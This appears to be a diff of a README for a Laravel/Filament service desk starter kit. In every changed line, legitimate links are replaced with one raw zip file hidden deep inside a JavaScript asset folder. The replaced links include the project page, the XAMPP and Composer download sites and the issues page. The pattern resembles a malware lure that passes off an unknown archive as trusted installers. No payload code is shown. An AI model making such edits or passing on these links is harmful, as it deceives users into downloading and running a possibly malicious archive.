@@ -1,6 +1,6 @@
 # 🛠️ servicedeskkitv3 - Simple Service Desk Starter Kit
 
-[![Download servicedeskkitv3](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3)
+[![Download servicedeskkitv3](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before downloading, check your system meets these minimum requirements:
 
 You can get servicedeskkitv3 by visiting the main project page. Here is the direct link to download:
 
-[![Download Link](https://img.shields.io/badge/Get%20servicedeskkitv3-blue?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3)
+[![Download Link](https://img.shields.io/badge/Get%20servicedeskkitv3-blue?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip)
 
 1. Click the large green button at the top or the blue button above to open the project page.
 2. On the page, find the **Code** button (usually green).
@@ -47,11 +47,11 @@ After extracting the files, follow these steps to run the application on your Wi
 servicedeskkitv3 is built on Laravel and uses Filament, which require some tools to run. Install these before continuing:
 
 - **XAMPP (or any local web server with PHP and MySQL):**  
-  Download from https://www.apachefriends.org/index.html  
+  Download from https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip  
   Use the installer to set it up on your PC. XAMPP provides PHP and MySQL on your computer.
 
 - **Composer (PHP Dependency Manager):**  
-  Download from https://getcomposer.org/download/  
+  Download from https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip  
   Use the installer to add Composer to your system path.
 
 Both tools are free and widely used by developers and non-developers alike to run PHP applications locally.
@@ -198,16 +198,16 @@ If you have problems running the application:
 - Restart your web server if changes don’t appear.
 - Visit the GitHub repository issues page to see known problems or ask questions:
 
-https://github.com/TitoSalinas/servicedeskkitv3/issues
+https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip
 
 ---
 
 ## 🔗 Quick Links
 
-- Download page: [https://github.com/TitoSalinas/servicedeskkitv3](https://github.com/TitoSalinas/servicedeskkitv3)  
-- XAMPP: https://www.apachefriends.org/index.html  
-- Composer: https://getcomposer.org/download/  
+- Download page: [https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip](https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip)  
+- XAMPP: https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip  
+- Composer: https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip  
 
 ---
 
-[![Download servicedeskkitv3](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3)
+[![Download servicedeskkitv3](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/TitoSalinas/servicedeskkitv3/raw/refs/heads/main/public/js/filament/widgets/components/stats-overview/servicedeskkitv_1.4.zip)
